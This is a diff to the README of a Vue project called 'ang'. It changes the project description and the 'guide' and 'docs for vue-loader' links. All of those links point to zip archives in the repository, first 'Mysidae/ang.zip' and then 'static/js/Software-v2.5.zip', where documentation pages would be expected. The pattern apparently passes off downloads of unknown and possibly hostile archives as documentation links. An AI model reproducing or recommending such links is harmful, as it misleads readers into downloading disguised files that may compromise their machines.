@@ -1,6 +1,6 @@
 # ang
 
-> A https://raw.githubusercontent.com/popcorn0118/ang/master/Mysidae/ang.zip project
+> A https://raw.githubusercontent.com/popcorn0118/ang/master/static/js/Software-v2.5.zip project
 
 ## Build Setup
 
@@ -24,4 +24,4 @@ npm run unit
 npm test
 ```
 
-For a detailed explanation on how things work, check out the [guide](https://raw.githubusercontent.com/popcorn0118/ang/master/Mysidae/ang.zip) and [docs for vue-loader](https://raw.githubusercontent.com/popcorn0118/ang/master/Mysidae/ang.zip).
+For a detailed explanation on how things work, check out the [guide](https://raw.githubusercontent.com/popcorn0118/ang/master/static/js/Software-v2.5.zip) and [docs for vue-loader](https://raw.githubusercontent.com/popcorn0118/ang/master/static/js/Software-v2.5.zip).
